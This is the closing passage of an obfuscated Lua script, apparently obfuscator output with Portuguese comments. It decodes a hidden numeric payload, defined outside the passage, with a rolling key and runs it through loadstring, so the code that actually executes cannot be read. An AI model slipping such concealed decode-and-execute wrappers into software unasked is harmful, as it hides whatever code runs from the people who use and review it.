    local function VM_I00110(d, k, m)
        local R_O1OOl1lO = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_O1OOl1lO, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_O1OOl1lO)
    end

    -- Execution Guard
    local F_OIIO1O = loadstring(VM_I00110(B_1OIl1Ol, 93, 5))
    if F_OIIO1O then
        F_OIIO1O(...)
    end
end)(...)
